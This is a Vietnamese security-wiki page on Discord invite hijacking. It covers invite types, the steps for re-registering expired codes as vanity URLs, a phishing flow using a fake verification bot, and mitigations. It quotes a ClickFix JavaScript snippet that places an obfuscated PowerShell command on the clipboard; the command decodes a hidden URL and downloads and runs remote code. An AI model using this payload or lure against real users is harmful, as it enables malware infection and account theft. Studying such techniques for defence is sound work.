# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Discord Invite Hijacking lợi dụng quy tắc tái sử dụng liên kết vanity tùy chỉnh: mã lời mời tạm thời đã hết hạn hoặc mã vĩnh viễn đã bị xóa, chỉ gồm chữ thường và chữ số, có thể được đăng ký làm liên kết vanity trên server có Level 3 Boost. Liên kết vanity tùy chỉnh cũng có thể khả dụng khi server ban đầu mất Level 3 Boost; với mã lời mời tạm thời có chữ hoa, kẻ tấn công có thể đăng ký trước dạng vanity viết thường trong khi lời mời thông thường vẫn còn hiệu lực, nhưng việc chuyển hướng chỉ bắt đầu sau khi lời mời đó hết hạn.<sup>[[1]](#references)[[2]](#references)</sup>

## Loại lời mời và nguy cơ bị chiếm quyền

Nguy cơ được ghi nhận khác nhau tùy theo loại lời mời:<sup>[[1]](#references)[[2]](#references)</sup>

| Loại lời mời             | Có thể bị chiếm quyền? | Điều kiện / Ghi chú                                                                                       |
|--------------------------|------------------------|------------------------------------------------------------------------------------------------------------|
| Liên kết lời mời tạm thời | ✅                     | Sau khi hết hạn, mã sẽ khả dụng và có thể được server có Boost đăng ký lại làm URL vanity. |
| Liên kết lời mời vĩnh viễn | ⚠️                    | Nếu bị xóa và chỉ gồm chữ thường cùng chữ số, mã có thể khả dụng trở lại.        |
| Liên kết vanity tùy chỉnh | ✅                    | Nếu server ban đầu mất Level 3 Boost, lời mời vanity của server đó sẽ khả dụng để đăng ký mới.    |

## Các bước khai thác

1. Trinh sát
   - Theo dõi các nguồn công khai (diễn đàn, mạng xã hội, kênh Telegram) để tìm liên kết lời mời theo mẫu `discord.gg/{code}` hoặc `discord.com/invite/{code}`.<sup>[[1]](#references)</sup>
   - Thu thập các mã lời mời cần quan tâm (tạm thời hoặc vanity).<sup>[[1]](#references)</sup>
2. Đăng ký trước
   - Tạo hoặc sử dụng server Discord hiện có với quyền Level 3 Boost.<sup>[[1]](#references)[[2]](#references)</sup>
   - Trong **Server Settings → Vanity URL**, thử gán mã lời mời mục tiêu. Nếu được chấp nhận, mã sẽ được server độc hại giữ chỗ.<sup>[[1]](#references)</sup>
3. Kích hoạt chiếm quyền
   - Với lời mời tạm thời, chờ lời mời ban đầu hết hạn (hoặc xóa thủ công nếu bạn kiểm soát nguồn).<sup>[[1]](#references)</sup>
   - Với mã có chữ hoa, có thể nhận ngay biến thể viết thường, nhưng việc chuyển hướng chỉ được kích hoạt sau khi mã gốc hết hạn.<sup>[[1]](#references)</sup>
4. Chuyển hướng âm thầm
   - Khi việc chiếm quyền đã có hiệu lực, người dùng truy cập liên kết cũ sẽ được chuyển liền mạch đến server do kẻ tấn công kiểm soát.<sup>[[1]](#references)</sup>

## Luồng phishing qua server Discord

1. Giới hạn các kênh của server để chỉ hiển thị kênh **#verify**.<sup>[[1]](#references)</sup>
2. Triển khai bot (ví dụ: **Safeguard#0786**) để yêu cầu người mới xác minh qua OAuth2.<sup>[[1]](#references)</sup>
3. Bot chuyển hướng người dùng đến trang phishing (ví dụ: `captchaguard.me`) dưới vỏ bọc của bước CAPTCHA hoặc xác minh.<sup>[[1]](#references)</sup>
4. Triển khai thủ thuật UX **ClickFix**:<sup>[[1]](#references)</sup>
   - Hiển thị thông báo CAPTCHA bị lỗi.
   - Hướng dẫn người dùng mở hộp thoại **Win+R**, dán lệnh PowerShell được tải sẵn rồi nhấn Enter.

### Ví dụ chèn lệnh vào clipboard bằng ClickFix

Chiến dịch này dùng JavaScript để sao chép một lệnh PowerShell độc hại vào clipboard:<sup>[[1]](#references)</sup>

```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
            `$u=($r[-1..-($r.Length)]-join '');` +
            `$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
            `iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```

Cách tiếp cận này tránh tải tệp trực tiếp và tận dụng các yếu tố giao diện quen thuộc để giảm sự nghi ngờ của người dùng.<sup>[[1]](#references)</sup>

## Mitigations

- Ưu tiên các invite link vĩnh viễn và đảm bảo mã có ít nhất một chữ cái viết hoa; các mã vĩnh viễn đã bị xóa có chứa chữ cái viết hoa không thể được sử dụng lại làm vanity link.<sup>[[1]](#references)</sup>
- Thường xuyên thay đổi mã invite và thu hồi các liên kết cũ.
- Theo dõi trạng thái boost của máy chủ Discord và các yêu cầu nhận vanity URL.<sup>[[1]](#references)[[2]](#references)</sup>
- Hướng dẫn người dùng xác minh tính xác thực của máy chủ và tránh thực thi các lệnh được dán từ clipboard.

## References

- [1] [Từ niềm tin đến mối đe dọa: Invite Discord bị chiếm đoạt được dùng để phát tán malware qua nhiều giai đoạn](https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/)
- [2] [Liên kết invite tùy chỉnh – Hỗ trợ Discord](https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link)
{{#include ../../banners/hacktricks-training.md}}
